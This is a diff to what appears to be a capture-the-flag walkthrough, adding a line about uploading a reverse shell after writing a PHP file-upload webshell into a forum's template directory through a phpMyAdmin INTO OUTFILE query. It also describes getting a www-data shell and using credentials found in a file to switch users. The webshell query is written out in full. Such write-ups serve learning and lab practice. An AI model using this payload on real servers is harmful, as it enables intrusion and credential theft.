@@ -38,6 +38,8 @@ With the help of phpmyadmin we can upload a php webshell that gives us arbitrary
 "<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
 INTO OUTFILE '/var/www/forum/templates_c/upload.php';`
 
+then we can upload a reverse shell you can find it in scripts
+
 We run a listener, and execute a reverse shell payload through our webshell this is how we get a shell with user www-data.
 
 We find a LOOKATME containing the credentials of user lmezard, we switch user with command su to lmezard, in it's home directory we find `fun` challenge.
